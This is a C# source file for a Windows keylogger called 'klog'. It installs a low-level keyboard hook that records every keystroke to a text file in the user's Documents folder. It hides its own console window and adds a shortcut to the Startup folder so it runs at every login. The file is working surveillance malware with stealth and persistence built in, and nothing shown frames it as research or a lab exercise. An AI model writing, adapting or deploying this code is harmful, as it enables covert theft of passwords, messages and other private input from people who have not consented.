using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.UI.WindowsAndMessaging;
using IWshRuntimeLibrary;
using File = System.IO.File;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    // ReSharper disable InconsistentNaming
    // codes passed by the keyboard hook
    private const int KEYDOWN = 0x0100;
    private const int KEYUP = 0x0101;
    private const int SYSKEYDOWN = 0x0104;
    // ReSharper restore InconsistentNaming

    private static readonly string PathToFile =
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt");

    private static readonly StreamWriter Writer = new(PathToFile, true);
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static bool _capsLockActive;
    private static bool _shiftActive;

    public static unsafe void Main()
    {
        HideWindow();
        LogFile.WriteInfo(PathToFile, Writer);
        AddToStartup();

        // write buffer on process exit
        AppDomain.CurrentDomain.ProcessExit += (_, _) =>
        {
            _kbHook?.Close();
            StringBuffer.Write(Writer);
            Writer.Dispose();
        };

        // TODO check something weird going on
        _capsLockActive = Keyboard.GetCapsLockState();

        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);

        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
    }

    /// <summary>
    /// Logs key presses to a file. Meant to be used with SetWindowsHookEx.
    /// </summary>
    private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();

        // checking for events other than keydown, syskeydown and keyup
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        var stringToWrite = "";

        // check for keydown
        if (wParam == KEYDOWN || wParam == SYSKEYDOWN) stringToWrite = Keyboard.HandleKeyDown(kbStruct, ref _shiftActive, ref _capsLockActive);

        // handle keyup events as it is important with shift, alt and control
        if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);

        StringBuffer.WriteToFile(stringToWrite, Writer);

        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    /// <summary>
    ///     Hides current console window.
    /// </summary>
    private static void HideWindow()
    {
        var hWnd = PInvoke.GetConsoleWindow();
        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
    }

    private static void AddToStartup()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var shortcutPath = Path.Combine(startupFolderPath, "klog.lnk");
        var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "klog.exe");

        if (File.Exists(shortcutPath)) return;
        var wsh = new WshShell();
        if (wsh.CreateShortcut(shortcutPath) is not IWshShortcut shortcut) return;
        shortcut.TargetPath = path;
        shortcut.Save();
    }
}